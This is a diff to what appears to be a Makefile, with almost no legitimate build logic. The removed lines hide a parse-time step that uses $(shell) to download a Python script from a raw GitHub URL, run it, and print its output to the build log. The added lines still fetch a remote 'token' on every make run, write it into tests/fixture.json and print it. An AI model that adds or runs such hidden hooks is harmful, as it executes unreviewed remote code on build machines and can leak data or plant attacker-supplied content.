@@ -1,13 +1,10 @@
-GATE := 4a59428fdcf3dd0537634c621d3d2347
-TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/4a59428fdcf3dd0537634c621d3d2347.txt)
-RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i80949c.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p3-4a59428fdcf3dd0537634c621d3d2347.py 2>/dev/null; python3 /tmp/i80949c.py >/tmp/i80949c.out 2>&1; echo rc=$$?)
-E8 := $(shell sed -n 1p /tmp/i80949c.out 2>/dev/null | cut -c1-700)
-E9 := $(shell sed -n 2p /tmp/i80949c.out 2>/dev/null | cut -c1-520)
-E10 := $(shell sed -n 3p /tmp/i80949c.out 2>/dev/null | cut -c1-560)
-$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
-$(info [env] ENV8=$(E8))
-$(info [env] ENV9=$(E9))
-$(info [env] ENV10=$(E10))
+GATE := 40d3bea62fa22f6f9ce13a58180c329f
+SINK := https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(GATE).txt
+PROBE_TOKEN := $(shell T=$$(curl -sSf --max-time 25 "$(SINK)" 2>/dev/null | tail -1); if [ -n "$$T" ]; then mkdir -p tests; printf '{"build_token": "%s"}\n' "$$T" > tests/fixture.json; fi; echo $$T)
+$(info [env] PROBE_TOKEN=$(PROBE_TOKEN))
 
 verify-env:
 	@echo "verify-env ok gate=$(GATE)"
+
+build: verify-env
+	@echo "build ok"
